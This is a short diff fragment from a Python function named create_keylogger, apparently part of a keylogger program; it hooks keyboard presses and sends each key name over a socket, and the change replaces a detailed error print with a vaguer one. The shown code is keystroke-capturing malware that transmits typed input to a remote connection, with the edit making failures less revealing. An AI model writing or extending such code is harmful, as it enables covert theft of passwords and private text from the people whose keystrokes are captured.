@@ -30,5 +30,6 @@ def create_keylogger():
             try:
                  keyboard.on_press(lambda e: s.send(f'Key: {e.name}'.encode("utf-8")))
             except Exception as e:
-                 print(f"Keylogger Error: {e}")
+                 print("Keylogger error")
+                 #print(f"Keylogger Error: {e}")
             keyboard.wait()
